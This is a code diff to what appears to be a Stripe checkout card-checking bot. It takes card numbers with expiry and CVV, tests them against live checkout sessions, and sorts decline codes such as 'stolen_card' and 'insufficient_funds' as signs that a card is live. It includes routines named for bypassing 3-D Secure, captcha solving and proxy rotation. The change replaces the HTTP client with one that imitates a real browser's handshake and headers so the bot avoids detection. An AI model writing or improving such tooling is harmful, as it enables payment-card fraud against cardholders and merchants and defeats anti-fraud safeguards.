@@ -1,4 +1,3 @@
-import httpx
 import asyncio
 import time
 import random
@@ -13,10 +12,22 @@ logging.basicConfig(level=logging.INFO, format='%(name)s: %(message)s')
 logger = logging.getLogger("stripe_co")
 logger.setLevel(logging.INFO)
 
+# The browser this gate pretends to be.  The client puts on that
+# browser's handshake and sends the headers that browser sends, and the
+# browser that solves the captcha is told the same name, so the token
+# it wins is good for the request that carries it.
+import os as _os
+import sys as _sys
+
+_bot_dir = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
+if _bot_dir not in _sys.path:
+    _sys.path.insert(0, _bot_dir)
+
+from browser_identity import (BrowserClient, api_headers, navigation_headers,
+                              USER_AGENT as UA)
+
 STRIPE_API = "https://api.stripe.com/v1"
 PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")
-
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
 LIVE_DECLINE_CODES = [
     "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
@@ -228,14 +239,7 @@ async def _fetch_checkout_info(client, checkout_url):
     # part after the # on it: the page needs it to be a whole page
     whole_url = f"{full_url}#{fragment}" if fragment else full_url
 
-    headers = {
-        "User-Agent": UA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-    }
+    headers = navigation_headers()
 
     try:
         resp = await client.get(full_url, headers=headers, follow_redirects=True, timeout=10)
@@ -248,8 +252,8 @@ async def _fetch_checkout_info(client, checkout_url):
         if resp.status_code in (400, 405):
             # Retry once without proxy
             logger.info(f"Got {resp.status_code}, retrying without proxy...")
-            no_proxy_kwargs = {"timeout": httpx.Timeout(10), "headers": {"User-Agent": UA}, "follow_redirects": True, "trust_env": False}
-            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback:
+            no_proxy_kwargs = {"timeout": 10, "follow_redirects": True}
+            async with BrowserClient(**no_proxy_kwargs) as fallback:
                 resp = await fallback.get(full_url, headers=headers, follow_redirects=True, timeout=10)
                 if resp.status_code in (400, 403, 405):
                     logger.error(f"Failed to load checkout: {resp.status_code}")
@@ -263,8 +267,8 @@ async def _fetch_checkout_info(client, checkout_url):
             # Retry once on disconnect
             logger.info("Server disconnected, retrying...")
             try:
-                no_proxy_kwargs = {"timeout": httpx.Timeout(10), "headers": {"User-Agent": UA}, "follow_redirects": True, "trust_env": False}
-                async with httpx.AsyncClient(**no_proxy_kwargs) as fallback:
+                no_proxy_kwargs = {"timeout": 10, "follow_redirects": True}
+                async with BrowserClient(**no_proxy_kwargs) as fallback:
                     resp = await fallback.get(full_url, headers=headers, follow_redirects=True, timeout=10)
                     html = resp.text
                     final_url = str(resp.url)
@@ -352,13 +356,8 @@ async def _fetch_checkout_info(client, checkout_url):
     pp_data = {}
 
     try:
-        pp_headers = {
-            "User-Agent": UA,
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://checkout.stripe.com",
-            "Referer": "https://checkout.stripe.com/",
-            "Accept": "application/json",
-        }
+        pp_headers = api_headers(origin="https://checkout.stripe.com",
+                                 referer="https://checkout.stripe.com/")
         pp_resp = await client.get(
             f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
             headers=pp_headers,
@@ -487,13 +486,8 @@ async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=
     js_ver = stripe_js_version or "5e27053bf5"
     pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"
 
-    headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://checkout.stripe.com",
-        "Referer": "https://checkout.stripe.com/",
-        "Accept": "application/json",
-    }
+    headers = api_headers(origin="https://checkout.stripe.com",
+                         referer="https://checkout.stripe.com/")
 
     pm_data = {
         "type": "card",
@@ -586,13 +580,8 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                                      stripe_js_version=None, billing_required=False,
                                      customer_email=None, session_info=None,
                                      proxy=None):
-    headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://checkout.stripe.com",
-        "Referer": "https://checkout.stripe.com/",
-        "Accept": "application/json",
-    }
+    headers = api_headers(origin="https://checkout.stripe.com",
+                         referer="https://checkout.stripe.com/")
 
     # Build confirm data with raw card data (avoids checkout_confirm_error with PM-first approach)
     js_ver = stripe_js_version or "5e27053bf5"
@@ -1077,21 +1066,11 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
 
     js_ver = stripe_js_version or "5e27053bf5"
 
-    headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://checkout.stripe.com",
-        "Referer": "https://checkout.stripe.com/",
-        "Accept": "application/json",
-    }
+    headers = api_headers(origin="https://checkout.stripe.com",
+                         referer="https://checkout.stripe.com/")
 
-    js_headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "Accept": "application/json",
-    }
+    js_headers = api_headers(origin="https://js.stripe.com",
+                             referer="https://js.stripe.com/")
 
     if not is_checkout:
         if intent_type == "payment_intent":
@@ -1209,13 +1188,8 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
             if not session_id or not is_checkout:
                 return None
             try:
-                pp_headers = {
-                    "User-Agent": UA,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Origin": "https://checkout.stripe.com",
-                    "Referer": "https://checkout.stripe.com/",
-                    "Accept": "application/json",
-                }
+                pp_headers = api_headers(origin="https://checkout.stripe.com",
+                                         referer="https://checkout.stripe.com/")
                 pp_data = {
                     "expected_payment_method_type": "card",
                     "key": pk,
@@ -1721,12 +1695,8 @@ async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk
             method_resp = await client.post(
                 three_ds_method_url,
                 data={"threeDSMethodData": method_payload},
-                headers={
-                    "User-Agent": UA,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Origin": "https://js.stripe.com",
-                    "Referer": "https://js.stripe.com/",
-                },
+                headers=api_headers(origin="https://js.stripe.com",
+                                    referer="https://js.stripe.com/"),
                 timeout=15,
             )
             fingerprint_data = method_payload
@@ -2047,12 +2017,10 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
         acs_resp = await client.post(
             acs_url,
             data={"creq": creq},
-            headers={
-                "User-Agent": UA,
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Origin": acs_url.split("/")[0] + "//" + acs_url.split("/")[2] if "/" in acs_url else "",
-            },
+            headers=api_headers(
+                origin=acs_url.split("/")[0] + "//" + acs_url.split("/")[2] if "/" in acs_url else "",
+                referer=acs_url,
+                accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
             timeout=20,
             follow_redirects=True,
         )
@@ -2112,10 +2080,7 @@ async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
             form_resp = await client.post(
                 action_url,
                 data=form_data,
-                headers={
-                    "User-Agent": UA,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
+                headers=api_headers(),
                 follow_redirects=True,
                 timeout=20,
             )
@@ -2175,8 +2140,8 @@ async def _try_solve_captcha_page(body, page_url):
         from captcha_solver import NOPECHA_KEY, CAPTCHAAI_KEY
         if not NOPECHA_KEY and not CAPTCHAAI_KEY:
             return None
-        import aiohttp as _aiohttp
-        async with _aiohttp.ClientSession() as sess:
+        from browser_identity import BrowserSession
+        async with BrowserSession() as sess:
             token = await solve_captcha_on_page(body, page_url, sess)
         return token
     except Exception as e:
@@ -2187,8 +2152,8 @@ async def _try_solve_captcha_page(body, page_url):
 async def _submit_captcha_and_check(body, page_url, token, captcha_type):
     try:
         from captcha_solver import submit_captcha_token
-        import aiohttp as _aiohttp
-        async with _aiohttp.ClientSession() as sess:
+        from browser_identity import BrowserSession
+        async with BrowserSession() as sess:
             final_url, _, success = await submit_captcha_token(sess, page_url, token, captcha_type, body)
         return final_url, success
     except Exception as e:
@@ -2201,10 +2166,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
         logger.info(f"3DS1: following redirect to {redirect_url[:80]}...")
         resp = await client.get(
             redirect_url,
-            headers={
-                "User-Agent": UA,
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            },
+            headers=navigation_headers(),
             follow_redirects=True,
             timeout=20,
         )
@@ -2257,10 +2219,7 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
             form_resp = await client.post(
                 action_url,
                 data=form_data,
-                headers={
-                    "User-Agent": UA,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
+                headers=api_headers(),
                 follow_redirects=True,
                 timeout=20,
             )
@@ -2298,12 +2257,8 @@ async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirec
 
 
 async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""):
-    headers = {
-        "User-Agent": UA,
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "Accept": "application/json",
-    }
+    headers = api_headers(origin="https://js.stripe.com",
+                         referer="https://js.stripe.com/")
 
     if intent_type == "payment_intent":
         endpoint = f"{STRIPE_API}/payment_intents/{intent_id}"
@@ -2360,13 +2315,8 @@ async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""
 async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
     intent_id = client_secret.split("_secret_")[0]
 
-    headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "Accept": "application/json",
-    }
+    headers = api_headers(origin="https://js.stripe.com",
+                         referer="https://js.stripe.com/")
 
     if intent_type == "payment_intent":
         endpoint = f"{STRIPE_API}/payment_intents/{intent_id}"
@@ -2411,11 +2361,9 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
     start = time.time()
 
     client_kwargs = {
-        "timeout": httpx.Timeout(15),
-        "headers": {"User-Agent": UA},
+        "timeout": 15,
         "follow_redirects": True,
         "proxy": None,
-        "trust_env": False,
     }
     if proxy == "NONE":
         pass
@@ -2426,7 +2374,7 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
         if p:
             client_kwargs["proxy"] = p
 
-    async with httpx.AsyncClient(**client_kwargs) as client:
+    async with BrowserClient(**client_kwargs) as client:
         if session_cache and session_cache.get("pk") and session_cache.get("session_id"):
             info = session_cache
             err = None
@@ -2457,13 +2405,9 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
             if not isinstance(_amount, (int, float)) or _amount is True:
                 logger.info(f"Amount missing (value={_amount!r}), re-fetching payment page info...")
                 try:
-                    pp_headers = {
-                        "User-Agent": UA,
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "Origin": "https://checkout.stripe.com",
-                        "Referer": "https://checkout.stripe.com/",
-                        "Accept": "application/json",
-                    }
+                    pp_headers = api_headers(
+                        origin="https://checkout.stripe.com",
+                        referer="https://checkout.stripe.com/")
                     pp_resp = await use_client.get(
                         f"{STRIPE_API}/payment_pages/{_sid}?key={_pk}",
                         headers=pp_headers,
@@ -2498,13 +2442,11 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
 
         if is_proxy_error:
             no_proxy_kwargs = {
-                "timeout": httpx.Timeout(30),
-                "headers": {"User-Agent": UA},
+                "timeout": 30,
                 "follow_redirects": True,
                 "proxy": None,
-                "trust_env": False,
             }
-            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback_client:
+            async with BrowserClient(**no_proxy_kwargs) as fallback_client:
                 info, err = await _fetch_checkout_info(fallback_client, checkout_url)
                 if err:
                     elapsed = round(time.time() - start, 2)
@@ -2518,13 +2460,11 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
         if status == "error" and using_proxy and ("failed" in msg.lower() or "403" in msg.lower()):
             logger.warning(f"Proxy may be blocked by Stripe API ({msg}), retrying without proxy...")
             no_proxy_kwargs = {
-                "timeout": httpx.Timeout(30),
-                "headers": {"User-Agent": UA},
+                "timeout": 30,
                 "follow_redirects": True,
                 "proxy": None,
-                "trust_env": False,
             }
-            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback_client:
+            async with BrowserClient(**no_proxy_kwargs) as fallback_client:
                 status, msg = await _run_confirm(fallback_client)
 
         elapsed = round(time.time() - start, 2)
